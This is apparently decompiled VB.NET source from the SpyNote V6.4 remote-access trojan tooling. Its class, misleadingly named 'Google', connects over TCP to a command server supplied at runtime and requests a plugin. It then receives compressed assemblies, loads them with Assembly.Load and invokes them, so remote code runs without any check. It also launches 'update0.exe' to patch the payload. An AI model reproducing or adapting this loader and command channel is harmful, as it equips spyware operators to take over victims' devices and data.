Imports System.IO
Imports System.IO.Compression
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports SpyNote_V6._4.SN.SpyNote.Stores

Namespace SN
    Public Class Google
        Public Sub New(arr As Array)
            Me.Count = -1L
            Me.Ref = Nothing
            Me.obj0 = Nothing
            Me.pl = Nothing
            Me.tc = Nothing
            Me.th0 = Nothing
            Me.ar0 = Nothing
            Me.syc0 = RuntimeHelpers.GetObjectValue(New Object())
            Me.syc1 = RuntimeHelpers.GetObjectValue(New Object())
            Me.syc2 = RuntimeHelpers.GetObjectValue(New Object())
            Me.ar0 = arr
            Me.buffer = New Byte(0) {}
            Me.MemoryStream = New MemoryStream()
            Me.Maxsize = -1L
            Me.Count = -1L
            Me.SizeData = New Integer() {-1, -1}
            Me.th0 = New Thread(New ThreadStart(AddressOf Me.Connect))
            Me.th0.Start()
        End Sub

        Private Function GetClient() As TcpClient
            Dim tcpClient As TcpClient = New TcpClient()
            Try
                tcpClient.ReceiveTimeout = -1
                tcpClient.SendTimeout = -1
                tcpClient.SendBufferSize = 102400
                tcpClient.ReceiveBufferSize = 102400
                Return tcpClient
            Catch ex As Exception
            End Try
            Return Nothing
        End Function

        Private Sub Connect()
            Try
                Dim obj As Object = Me.syc1
                ObjectFlowControl.CheckForSyncLockOnValueType(obj)
                SyncLock obj
                    Dim flag3 As Boolean
                    Do
                        Me.tc = Me.GetClient()
                        Try
                            Me.tc.Connect(Conversions.ToString(Me.ar0.GetValue(0)), Conversions.ToInteger(Me.ar0.GetValue(1)))
                            Dim flag2 As Boolean = Me.tc.Client.Connected And Me.tc.GetStream().CanWrite And Me.tc.GetStream().CanRead
                            flag3 = flag2
                            If flag2 Then
                                Me.buffer = New Byte(0) {}
                                Me.MemoryStream = New MemoryStream()
                                Me.Maxsize = -1L
                                Me.Count = -1L
                                Me.SizeData = New Integer() {-1, -1}
                                Me.Send("getPlugin.EXE", Me.Encoding0().GetBytes("null"))
                                Me.tc.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)
                                Exit Try
                            End If
                            flag3 = False
                        Catch ex As SocketException
                            Me.Disconnect()
                        Catch ex2 As Exception
                            Me.Disconnect()
                        End Try
                        Thread.Sleep(500)
                    Loop While Not flag3
                End SyncLock
            Catch ex3 As Exception
            End Try
        End Sub

        Private Sub Disconnect()
            Dim obj As Object = Me.syc1
            ObjectFlowControl.CheckForSyncLockOnValueType(obj)
            SyncLock obj
                Try
                    If Me.tc.Client.Connected Then
                        Me.tc.GetStream().Dispose()
                        Me.tc.GetStream().Close()
                        Me.tc.Client.Close()
                    End If
                    Me.pl = Nothing
                    Me.obj0 = Nothing
                Catch ex As Exception
                End Try
            End SyncLock
        End Sub

        Private Sub Send(s As String, b As Byte())
            Try
                Dim state As Object() = New Object() {s, b}
                ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
                                                 Me.SendToServer(CType(a0, Object()))
                                             End Sub, state)
                Thread.Sleep(1)
            Catch ex As Exception
            End Try
        End Sub

        Private Sub SendToServer(ob As Object())
            Try
                Dim obj As Object = Me.syc2
                ObjectFlowControl.CheckForSyncLockOnValueType(obj)
                SyncLock obj
                    Dim s As String = CStr(ob(0))
                    Dim b As Byte() = CType(ob(1), Byte())
                    Dim array As Byte() = Me.FormatPacket(s, b)
                    Me.tc.Client.SendBufferSize = array.Length
                    Me.tc.GetStream().Write(array, 0, array.Length)
                End SyncLock
            Catch ex As Exception
            End Try
        End Sub

        Private Function FormatPacket(s As String, b As Byte()) As Byte()
            Dim memoryStream As MemoryStream = New MemoryStream()
            Dim array As Byte() = Me.CGzip(b)
            Dim array2 As Byte() = Me.CGzip(Me.Encoding0().GetBytes(s))
            Dim bytes As Byte() = Me.Encoding0().GetBytes(Conversions.ToString(array2.Length))
            Dim bytes2 As Byte() = Me.Encoding0().GetBytes(vbNullChar)
            Dim bytes3 As Byte() = Me.Encoding0().GetBytes(Conversions.ToString(array.Length))
            memoryStream.Write(bytes, 0, bytes.Length)
            memoryStream.Write(bytes2, 0, bytes2.Length)
            memoryStream.Write(bytes3, 0, bytes3.Length)
            memoryStream.Write(bytes2, 0, bytes2.Length)
            memoryStream.Write(array2, 0, array2.Length)
            memoryStream.Write(array, 0, array.Length)
            Dim result As Byte() = memoryStream.ToArray()
            memoryStream.Dispose()
            Return result
        End Function

        Public Sub DataRecieved(ar As IAsyncResult)
            Try
                Try
                    Dim socketError As SocketError
                    Dim num As Integer = If(Me.tc.Client.Connected, Me.tc.Client.EndReceive(ar, socketError), 0)
                    If socketError > SocketError.Success Then
                        num = 0
                    End If
                    If num > 0 Then
                        If Me.Maxsize = -1L Then
                            If Me.buffer(0) = 0 Then
                                Me.MemoryStream.WriteByte(Me.buffer(0))
                                Me.Count += 1L
                                If Me.Count = 1L Then
                                    Dim text As String = Store.Encoding().GetString(Me.MemoryStream.ToArray()).Trim()
                                    Dim array As String() = text.Split(New Char(0) {}, StringSplitOptions.None)
                                    Dim num2 As Long = Conversions.ToLong(array(0).Trim())
                                    Dim num3 As Long = Conversions.ToLong(array(1).Trim())
                                    Me.SizeData = New Long() {num2, num3}
                                    Me.Maxsize = num2 + num3
                                    Dim maxsize As Long = Me.Maxsize
                                    Me.tc.Client.ReceiveBufferSize = CInt(maxsize)
                                    Me.Count = -1L
                                    Me.buffer = New Byte(CInt((Me.Maxsize - 1L)) + 1 - 1 + 1 - 1) {}
                                    Me.MemoryStream.Dispose()
                                    Me.MemoryStream = New MemoryStream()
                                End If
                            Else
                                Me.MemoryStream.WriteByte(Me.buffer(0))
                            End If
                        Else
                            Me.MemoryStream.Write(Me.buffer, 0, num)
                            If CLng(Me.MemoryStream.ToArray().Length) = Me.Maxsize Then
                                Dim array2 As Array = Me.SplitByte(Me.MemoryStream.ToArray(), CType(Me.SizeData, Array))
                                Dim array3 As Byte() = CType(array2.GetValue(0), Byte())
                                Dim bytes As Byte() = Me.DEGzip(array3)
                                array3 = CType(array2.GetValue(1), Byte())
                                Dim array4 As Byte() = Me.DEGzip(array3)
                                Dim [string] As String = Me.Encoding0().GetString(bytes)
                                Dim array5 As Byte() = array4
                                Dim array6 As String() = [string].Split(New String() {genr.spl}, StringSplitOptions.None)
                                Dim left As String = array6(0)
                                If Operators.CompareString(left, "exec", False) <> 0 Then
                                    If Operators.CompareString(left, "status", False) = 0 Then
                                        Dim thread As Thread = New Thread(Sub(a0 As Object)
                                                                              Me.IsConected(CType(a0, Object()))
                                                                          End Sub)
                                        Dim parameter As Object() = New Object() {array6(1), array6(2), array5, array6(3), array6(4), array6(5), array6(6), array6(7), array6(8), array6(9)}
                                        thread.Start(parameter)
                                    End If
                                ElseIf Me.pl Is Nothing And Me.obj0 Is Nothing Then
                                    Me.pl = Assembly.Load(array5)
                                    Me.obj0 = RuntimeHelpers.GetObjectValue(Me.pl.CreateInstance(array6(2)))
                                    Dim instance As Object = Me.obj0
                                    Dim type As Type = Nothing
                                    Dim memberName As String = "INSERT"
                                    Dim array7 As Object() = New Object(1) {}
                                    Dim num4 As Integer = 0
                                    Dim array8 As String() = array6
                                    Dim num5 As Integer = 3
                                    array7(num4) = array8(num5)
                                    array7(1) = Me.Encoding0().GetBytes(array6(4))
                                    Dim array9 As Object() = array7
                                    Dim argumentNames As String() = Nothing
                                    Dim typeArguments As Type() = Nothing
                                    Dim array10 As Boolean() = New Boolean(1) {}
                                    array10(0) = True
                                    Dim array11 As Boolean() = array10
                                    Dim obj As Object = NewLateBinding.LateGet(instance, type, memberName, array7, argumentNames, typeArguments, array10)
                                    If array11(0) Then
                                        array8(num5) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9(0)), GetType(String)))
                                    End If
                                    Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
                                    If Operators.CompareString(array6(1), "null", False) <> 0 Then
                                        Me.Send(array6(1), CType(objectValue, Byte()))
                                    End If
                                Else
                                    Dim instance2 As Object = Me.obj0
                                    Dim type2 As Type = Nothing
                                    Dim memberName2 As String = "INSERT"
                                    Dim array12 As Object() = New Object(1) {}
                                    Dim num6 As Integer = 0
                                    Dim array13 As String() = array6
                                    Dim num7 As Integer = 3
                                    array12(num6) = array13(num7)
                                    array12(1) = array5
                                    Dim array9 As Object() = array12
                                    Dim argumentNames2 As String() = Nothing
                                    Dim typeArguments2 As Type() = Nothing
                                    Dim array14 As Boolean() = New Boolean() {True, True}
                                    Dim array11 As Boolean() = array14
                                    Dim obj As Object = NewLateBinding.LateGet(instance2, type2, memberName2, array12, argumentNames2, typeArguments2, array14)
                                    If array11(0) Then
                                        array13(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9(0)), GetType(String)))
                                    End If
                                    If array11(1) Then
                                        array5 = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9(1)), GetType(Byte())), Byte())
                                    End If
                                    Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(obj)
                                    If Operators.CompareString(array6(1), "null", False) <> 0 Then
                                        Me.Send(array6(1), CType(objectValue2, Byte()))
                                    End If
                                End If
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New MemoryStream()
                                Me.Maxsize = -1L
                                Me.buffer = New Byte(0) {}
                                Me.Count = -1L
                                Me.SizeData = New Integer() {-1, -1}
                            Else
                                Me.buffer = New Byte(CInt((Me.Maxsize - Me.MemoryStream.Length - 1L)) + 1 - 1 + 1 - 1) {}
                            End If
                        End If
                    End If
                Catch ex As SocketException
                    Me.Disconnect()
                    Me.Connect()
                End Try
            Catch ex2 As Exception
                Me.Disconnect()
                Me.Connect()
            End Try
            Try
                Me.tc.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)
            Catch ex3 As Exception
                Me.Disconnect()
                Me.Connect()
            End Try
        End Sub

        Private Sub cmd(Argum As String)
            Try
                Dim text As String = Store.myfolder(0) + "update0.exe"
                If File.Exists(text) Then
                    Process.Start(New ProcessStartInfo() With {.FileName = text, .Arguments = Argum, .WindowStyle = ProcessWindowStyle.Normal})
                    ProjectData.EndApp()
                End If
            Catch ex As Exception
            End Try
        End Sub

        Public Sub IsConected(ParametersObject As Object())
            If genr.nx.InvokeRequired Then
                genr.nx.Invoke(New Google.sok(AddressOf Me.IsConected), New Object() {RuntimeHelpers.GetObjectValue(ParametersObject)})
            Else
                Try
                    Dim objectValue As Object = RuntimeHelpers.GetObjectValue(ParametersObject(9))
                    If Operators.CompareString(Conversions.ToString(ParametersObject(0)), "no", False) = 0 Then
                        My.Forms.LogoSN.F = 0
                        My.Forms.LogoSN.Refresh()
                    ElseIf Operators.CompareString(Conversions.ToString(ParametersObject(0)), "yes", False) = 0 Then
                        Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(Me.GetRegistryValue("spynote", Nothing))
                        Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(Me.GetRegistryValue("patch", Nothing))
                        If objectValue2 IsNot Nothing And objectValue3 IsNot Nothing Then
                            Dim objectValue4 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(3))
                            Dim objectValue5 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(4))
                            Dim objectValue6 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(5))
                            If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(objectValue6, objectValue2, False))) Then
                                Dim argum As String = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue4, "|"), objectValue5), "|"), objectValue6), "|"), "ALL"), "|"), objectValue))
                                Me.cmd(argum)
                            End If
                            Dim objectValue7 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(6))
                            Dim objectValue8 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(7))
                            Dim objectValue9 As Object = RuntimeHelpers.GetObjectValue(ParametersObject(8))
                            If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(objectValue9, objectValue3, False))) Then
                                Dim argum2 As String = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue7, "|"), objectValue8), "|"), objectValue9), "|"), Store.myfolder(0)), "Resources\Imports\Payload\"), "|"), objectValue))
                                Me.cmd(argum2)
                            End If
                        End If
                        My.Forms.LogoSN.F = 1
                        My.Forms.LogoSN.Refresh()
                    End If
                    If Operators.ConditionalCompareObjectEqual(ParametersObject(1), "True", False) Then
                        Dim thread As Thread = New Thread(Sub(a0 As Object)
                                                              Me.Assm(CType(a0, Byte()))
                                                          End Sub)
                        thread.Start(RuntimeHelpers.GetObjectValue(ParametersObject(2)))
                    End If
                Catch ex As Exception
                    My.Forms.LogoSN.F = 0
                    My.Forms.LogoSN.Refresh()
                End Try
            End If
        End Sub

        Public Function GetRegistryValue(KeyName As String, Optional DefaultValue As Object = Nothing) As Object
            Dim result As Object = Nothing
            Try
                Dim registryKey As RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\spynote", True)
                If registryKey IsNot Nothing Then
                    result = RuntimeHelpers.GetObjectValue(registryKey.GetValue(KeyName, RuntimeHelpers.GetObjectValue(DefaultValue)))
                End If
                If registryKey IsNot Nothing Then
                    registryKey.Close()
                End If
            Catch ex As Exception
            End Try
            Return result
        End Function

        Private Sub Assm(b As Byte())
            If Me.Ref Is Nothing Then
                Try
                    Me.Ref = Assembly.Load(b)
                    Dim entryPoint As Object = Me.Ref.EntryPoint
                    NewLateBinding.LateCall(entryPoint, Nothing, "Invoke", New Object(1) {}, Nothing, Nothing, Nothing, True)
                Catch ex As Exception
                End Try
            End If
        End Sub

        Private Function IsConnected(ByRef client As TcpClient) As Boolean
            Dim result As Boolean
            Try
                result = (Not client.Client.Poll(-1, SelectMode.SelectRead) OrElse client.Available <> 0)
            Catch ex As Exception
                result = False
            End Try
            Return result
        End Function

        Private Function Encoding0() As Encoding
            Return Encoding.UTF8
        End Function

        Private Function SplitByte(b As Byte(), s As Array) As Object()
            Dim obj As Object = Me.syc0
            ObjectFlowControl.CheckForSyncLockOnValueType(obj)
            Dim result As Object()
            SyncLock obj
                Dim array As Object() = New Object(1) {}
                Dim memoryStream As MemoryStream = New MemoryStream()
                Dim num As Long = CLng(s.GetValue(0))
                memoryStream.Write(b, 0, CInt(num))
                array(0) = memoryStream.ToArray()
                memoryStream.Dispose()
                memoryStream = New MemoryStream()
                Dim num2 As Long = CLng(s.GetValue(1))
                memoryStream.Write(b, CInt(num), CInt(num2))
                array(1) = memoryStream.ToArray()
                memoryStream.Dispose()
                result = array
            End SyncLock
            Return result
        End Function

        Public Function CGzip(raw As Byte()) As Byte()
            Dim result As Byte()
            Try
                Using memoryStream As MemoryStream = New MemoryStream()
                    If memoryStream.CanSeek Then
                        memoryStream.Seek(0L, SeekOrigin.Begin)
                    End If
                    Using gzipStream As GZipStream = New GZipStream(memoryStream, CompressionMode.Compress, True)
                        gzipStream.Write(raw, 0, raw.Length)
                    End Using
                    result = memoryStream.ToArray()
                End Using
            Catch ex As Exception
            End Try
            Return result
        End Function

        Public Function DEGzip(ByRef compress As Byte()) As Byte()
            Dim result As Byte()
            Try
                Using memoryStream As MemoryStream = New MemoryStream()
                    Using memoryStream2 As MemoryStream = New MemoryStream(compress)
                        If memoryStream2.CanSeek Then
                            memoryStream2.Seek(0L, SeekOrigin.Begin)
                        End If
                        Using gzipStream As GZipStream = New GZipStream(memoryStream2, CompressionMode.Decompress)
                            Me.CopyStreamToStream(gzipStream, memoryStream)
                        End Using
                        result = memoryStream.ToArray()
                    End Using
                End Using
            Catch ex As Exception
            End Try
            Return result
        End Function

        Public Sub CopyStreamToStream(input As Stream, output As Stream)
            Try
                Dim array As Byte() = New Byte(16383) {}
                Dim count As Integer
                While Me.InlineAssignHelper(Of Integer)(count, input.Read(array, 0, array.Length)) > 0
                    output.Write(array, 0, count)
                End While
            Catch ex As Exception
            End Try
        End Sub

        Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
            target = value
            Return value
        End Function

        Private pl As Assembly

        Private obj0 As Object

        Private tc As TcpClient

        Private th0 As Thread

        Private ar0 As Array

        Private syc0 As Object

        Private syc1 As Object

        Private syc2 As Object

        Public buffer As Byte()

        Public MemoryStream As MemoryStream

        Public Maxsize As Long

        Public Count As Long

        Public SizeData As Object

        Private Ref As Assembly

        Private Enum I
            SendTimeout = -1
            ReceiveTimeout = -1
            SendBufferSize = 102400
            ReceiveBufferSize = 102400
        End Enum

        Public Delegate Sub sok(ParametersObject As Object())
    End Class
End Namespace
